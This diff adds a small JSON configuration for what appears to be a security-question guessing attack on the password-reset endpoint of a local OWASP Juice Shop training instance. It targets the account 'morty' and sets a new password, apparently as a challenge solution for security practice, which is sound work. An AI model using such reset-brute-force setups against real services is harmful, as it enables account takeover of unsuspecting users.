@@ -1,0 +1,11 @@
+{
+    "word": "snowball",
+    "payloadValueReplace": "answer",
+    "url": "http://localhost:3000/rest/user/reset-password",
+    "payload": {
+        "email": "morty@juice-sh.op",
+        "answer": "",
+        "new": "morty01",
+        "repeat": "morty01"
+    }
+}
